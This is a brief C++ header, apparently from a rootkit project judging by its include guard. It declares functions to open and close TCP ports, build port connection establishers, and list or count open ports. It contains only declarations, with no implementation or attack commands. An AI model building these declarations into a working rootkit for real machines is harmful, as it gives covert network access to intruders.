#ifndef ROOTKIT_BASIC_NETWORK_ACCESS_H
#define ROOTKIT_BASIC_NETWORK_ACCESS_H

#include <vector>

#include "basic_server.h"
#include "tcp_port.h"

void open_tcp_port(TCP_PORT);
void close_tcp_port(TCP_PORT);

std::unique_ptr<basic_connection_establisher> generate_tcp_port_connection_establisher(TCP_PORT);

std::vector<TCP_PORT> get_all_open_tcp_ports();
size_t count_open_tcp_ports();


#endif //ROOTKIT_BASIC_NETWORK_ACCESS_H
